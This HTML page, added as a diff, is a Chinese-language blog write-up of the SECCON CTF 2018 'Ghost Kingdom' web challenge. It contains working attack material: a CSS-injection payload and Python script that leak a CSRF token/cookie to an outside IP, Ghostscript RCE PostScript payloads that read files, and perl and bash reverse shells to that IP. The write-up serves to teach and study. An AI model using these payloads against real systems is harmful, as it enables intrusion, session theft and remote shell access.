@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,SSRF,CSS注入," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="最近打了SECCON CTF2018,只有一道唯一的web题，质量挺不错，学到了新姿势。 Ghost Kingdom题目介绍先简单介绍一下题目，有注册、登录、message to admin、take a screenshot、upload image几个功能">
+<meta name="keywords" content="CTF,SSRF,CSS注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SECCONCTF2018-GhostKingdom">
+<meta property="og:url" content="http://yoursite.com/2018/10/30/secconctf2018-GHOSTKINGDOM/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="最近打了SECCON CTF2018,只有一道唯一的web题，质量挺不错，学到了新姿势。 Ghost Kingdom题目介绍先简单介绍一下题目，有注册、登录、message to admin、take a screenshot、upload image几个功能">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540903275964.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540903710867.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540903721797.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540913252440.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540911797585.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540912367796.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540913579440.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540914270062.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540914300027.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540901513679.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540902602145.png">
+<meta property="og:updated_time" content="2018-10-30T15:54:17.290Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SECCONCTF2018-GhostKingdom">
+<meta name="twitter:description" content="最近打了SECCON CTF2018,只有一道唯一的web题，质量挺不错，学到了新姿势。 Ghost Kingdom题目介绍先简单介绍一下题目，有注册、登录、message to admin、take a screenshot、upload image几个功能">
+<meta name="twitter:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540903275964.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/30/secconctf2018-GHOSTKINGDOM/"/>
+
+
+
+
+
+  <title>SECCONCTF2018-GhostKingdom | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">大学生的酸腐和矫情是这世界上最没用的东西.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/30/secconctf2018-GHOSTKINGDOM/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SECCONCTF2018-GhostKingdom</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-10-30T23:49:46+08:00">
+                2018-10-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近打了SECCON CTF2018,只有一道唯一的web题，质量挺不错，学到了新姿势。</p>
+<h1 id="Ghost-Kingdom"><a href="#Ghost-Kingdom" class="headerlink" title="Ghost Kingdom"></a>Ghost Kingdom</h1><h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><p>先简单介绍一下题目，有注册、登录、<code>message to admin</code>、<code>take a screenshot</code>、<code>upload image</code>几个功能<a id="more"></a><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540903275964.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540903710867.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540903721797.png" alt="enter description here">所有功能的实现都是以get请求的方式完成，<code>upload image</code>功能提示必须从<code>localhost</code>登录才能使用。<code>take a screenshot</code>功能是传入一个url，返回那个url的截屏。一开始，理所当然地以为是要<code>XSS+SSRF</code>之类的，毕竟有一个<code>message to admin</code>功能，后面才发现想错了。<code>&lt;&gt;</code>被实体编码了，会原封不动放到页面上，这里是无法进行<code>XSS</code>的，需要另想办法。</p>
+<h2 id="利用take-a-screenshot功能在localhost登录"><a href="#利用take-a-screenshot功能在localhost登录" class="headerlink" title="利用take a screenshot功能在localhost登录"></a>利用<code>take a screenshot</code>功能在localhost登录</h2><p>前面说了，所有请求都是get请求，所以我们是可以通过这个功能的url去实现登录的,直接用<code>127.0.0.1</code>不行<img src="https://www.github.com/coomrade/Img/raw/master/pics/1540913252440.png" alt="enter description here">可以用<code>0.0.0.0</code>绕过，然后实现登录。</p>
+<h2 id="CSS注入"><a href="#CSS注入" class="headerlink" title="CSS注入"></a>CSS注入</h2><p>在进一步探索中，我们可以发现两个点。</p>
+<ul>
+<li>在<code>message to admin</code>页面，有一个<code>preview</code>的功能，可以发现它的参数有些奇怪，比如<code>http://ghostkingdom.pwn.seccon.jp/?css=c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&amp;msg=%3Csadsa%3E&amp;action=msgadm2</code>这个<code>css</code>参数解码出来是<code>span{background-color:red;color:yellow}</code>，与页面呈现出来的符合。查看源码可以看到它被嵌入到了代码中。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1540911797585.png" alt="enter description here"></li>
+<li>源码中可以看到有一个<code>hidden</code>的<code>input</code>，存了一个<code>csrf</code>的值，我们可以发现，这个值跟当前的cookie值是相同的。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1540912367796.png" alt="enter description here"></li>
+</ul>
+<p>综合这两点，可以用一个新姿势，也就是CSS注入。CSS注入的<code>payload</code>是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input[value^=&quot;0&quot;] &#123;background: url(http://123.207.99.17/?csrf=0)&#125;</span><br><span class="line">input[value^=&quot;1&quot;] &#123;background: url(http://123.207.99.17/?csrf=1)&#125;</span><br><span class="line">input[value^=&quot;2&quot;] &#123;background: url(http://123.207.99.17/?csrf=2)&#125;</span><br><span class="line">etc...</span><br></pre></td></tr></table></figure></p>
+<p>用到了css的选择器的性质，符合不同的选择器就会向VPS发送不同的请求。根据这个，结合<code>take a screenshot</code>功能，我们就可以拿到用户在<code>localhost</code>的<code>cookie</code>，然后使用<code>upload image</code>功能。exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests,base64</span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">'Host'</span>: <span class="string">'ghostkingdom.pwn.seccon.jp'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line"><span class="string">'Referer'</span>: <span class="string">'http://ghostkingdom.pwn.seccon.jp/?action=sshot'</span>,</span><br><span class="line"><span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>: <span class="string">'CGISESSID=3bd2c1e04825a87e83633a'</span>,</span><br><span class="line"><span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>&#125;</span><br><span class="line">proxies=&#123;<span class="string">'http'</span>:<span class="string">'http://127.0.0.1:8080'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBase64</span><span class="params">(s)</span>:</span></span><br><span class="line">    z = []</span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span>  <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz'</span>:</span><br><span class="line">        st = s+i</span><br><span class="line">        z.append(<span class="string">'input[value^="&#123;&#125;"] &#123;&#123;background: url(http://123.207.99.17/?csrf=&#123;&#125;)&#125;&#125;'</span>.format(st, st))</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(<span class="string">'\n'</span>.join(z))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">formatURL</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"http://0.0.0.0/?css=&#123;&#125;%%26action=msgadm2"</span>.format(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=requests.get(url=<span class="string">'http://ghostkingdom.pwn.seccon.jp/?url='</span>+formatURL(getBase64(<span class="string">''</span>))+<span class="string">'&amp;action=sshot2'</span>,</span><br><span class="line">	headers=headers,timeout=<span class="number">2</span>,proxies=proxies)</span><br></pre></td></tr></table></figure></p>
+<p>需要点时间，最后拿到了<code>cookie</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540913579440.png" alt="enter description here"></p>
+<h2 id="利用Ghostscript漏洞进行RCE"><a href="#利用Ghostscript漏洞进行RCE" class="headerlink" title="利用Ghostscript漏洞进行RCE"></a>利用Ghostscript漏洞进行RCE</h2><p>然后我们可以使用文件上传功能了，上传上去的文件，可以<code>convert to gif format</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540914270062.png" alt="enter description here">随便传一个非图片的文件上去，会报错<img src="https://www.github.com/coomrade/Img/raw/master/pics/1540914300027.png" alt="enter description here">搜索报错信息，可以发现这里用的是一个叫<code>ImageMagick</code>的图片格式转换工具，进而可以搜到<code>Ghostscript</code>的远程代码执行漏洞.</p>
+<blockquote>
+<p>Ghostscript是一套建基于Adobe、PostScript及可移植文档格式（PDF）的页面描述语言等而编译成的免费软件<br>ImageMagick无法直接实现pdf文档到图片的转换，需要借助于ghostscript软件包</p>
+</blockquote>
+<p>在<a href="http://gv7.me/articles/2018/ghostscript-rce-20180821/" target="_blank" rel="noopener">这里</a>可以找到<code>ghostscript</code>RCE的POC<br>列目录的exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%$(ls /var/www/html/FLAG/)) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p>
+<p>然后，读flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%$(cat  /var/www/html/FLAG/FLAGflagF1A8.txt)) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540901513679.png" alt="enter description here"><br>用<code>perl</code>可以反弹<code>shell</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%perl -e &apos;use Socket;$i=&quot;123.207.99.17&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p>
+<p>bash也可以<code>bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/123.207.99.17/2333 0&gt;&amp;1&#39;</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540902602145.png" alt="enter description here"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+          
+            <a href="/tags/CSS注入/" rel="tag"># CSS注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/29/从RCTF2018-r-cursive得到的一些收获/" rel="next" title="从RCTF2018_r-cursive得到的一些收获">
+                <i class="fa fa-chevron-left"></i> 从RCTF2018_r-cursive得到的一些收获
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Ghost-Kingdom"><span class="nav-number">1.</span> <span class="nav-text">Ghost Kingdom</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目介绍"><span class="nav-number">1.1.</span> <span class="nav-text">题目介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用take-a-screenshot功能在localhost登录"><span class="nav-number">1.2.</span> <span class="nav-text">利用take a screenshot功能在localhost登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSS注入"><span class="nav-number">1.3.</span> <span class="nav-text">CSS注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用Ghostscript漏洞进行RCE"><span class="nav-number">1.4.</span> <span class="nav-text">利用Ghostscript漏洞进行RCE</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
